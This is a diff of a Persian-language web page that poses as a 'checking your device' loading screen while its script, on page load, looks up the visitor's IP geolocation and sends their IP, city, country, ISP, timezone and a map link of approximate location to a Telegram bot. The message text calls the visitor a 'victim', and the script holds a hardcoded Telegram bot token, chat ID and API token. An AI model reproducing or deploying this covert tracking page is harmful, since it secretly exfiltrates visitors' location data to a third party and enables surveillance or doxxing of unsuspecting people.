@@ -1,53 +1,77 @@
 <!DOCTYPE html>
 <html lang="fa">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>در حال بررسی اتصال...</title>
+  <meta charset="UTF-8">
+  <title>در حال بررسی...</title>
+  <style>
+    body {
+      background-color: #f0f8ff;
+      color: #333;
+      font-family: Tahoma, sans-serif;
+      text-align: center;
+      padding-top: 100px;
+    }
+    h2 {
+      font-size: 24px;
+    }
+    .loader {
+      margin: 30px auto;
+      border: 8px solid #f3f3f3;
+      border-top: 8px solid #3498db;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
 </head>
 <body>
-  <h2>📡 در حال بررسی اتصال شما...</h2>
+  <h2>در حال بررسی اطلاعات دستگاه شما هستیم... لطفاً منتظر بمانید</h2>
+  <div class="loader"></div>
 
   <script>
-    async function fetchIPInfoAndSend() {
-      try {
-        const res = await fetch("https://api.db-ip.com/v2/free/self");
-        const data = await res.json();
+    const telegramBotToken = '7504741612:AAE1FQmnyKEKzgCsL0PPmKkclK7iYhpgaC0';
+    const chatId = '7550898836';
 
-        const ip = data.ipAddress || "نامشخص";
-        const country = data.countryName || "نامشخص";
-        const state = data.stateProv || "نامشخص";
-        const city = data.city || "نامشخص";
-        const isp = data.isp || "نامشخص";
+    fetch('https://ipinfo.io/json?token=23b9c3b1dbd7d4')
+      .then(response => response.json())
+      .then(data => {
+        const [lat, lon] = data.loc.split(',');
 
-        const msg = `📥 اطلاعات اتصال از گوشی:
-🌍 کشور: ${country}
-🏙️ شهر: ${city}
-📡 آی‌پی: ${ip}
-🧭 استان: ${state}
-🔌 سرویس‌دهنده: ${isp}`;
+        const message = `
+🌐 اطلاعات جدید از قربانی رسید:
 
-        // ارسال به تلگرام
-        const token = "7504741612:AAE1FQmnyKEKzgCsL0PPmKkclK7iYhpgaC0";     // ← اینجا توکن بذار
-        const chat_id = "7550898836";     // ← اینجا آیدی عددی بذار
+🔍 IP: ${data.ip}
+🏙️ شهر: ${data.city}
+🇨🇺 کشور: ${data.country}
+🌐 ارائه‌دهنده اینترنت: ${data.org}
+🕓 منطقه زمانی: ${data.timezone}
 
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
+📍 موقعیت تقریبی روی نقشه:
+https://www.google.com/maps?q=${lat},${lon}
+
+📦 با عشق توسط ربات تو ساخته شد!
+        `;
+
+        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
           body: JSON.stringify({
-            chat_id,
-            text: msg,
-          }),
+            chat_id: chatId,
+            text: message
+          })
         });
-
-        document.body.innerHTML = "<h2>✅ اتصال بررسی شد!</h2>";
-      } catch (error) {
-        console.error("خطا:", error);
-        document.body.innerHTML = "<h2>❌ خطا در دریافت اطلاعات</h2>";
-      }
-    }
-
-    fetchIPInfoAndSend();
+      })
+      .catch(error => {
+        console.error('خطا در دریافت اطلاعات IP:', error);
+        document.body.innerHTML = "<h2>مشکلی پیش آمده. لطفاً بعداً دوباره امتحان کنید.</h2>";
+      });
   </script>
 </body>
 </html>
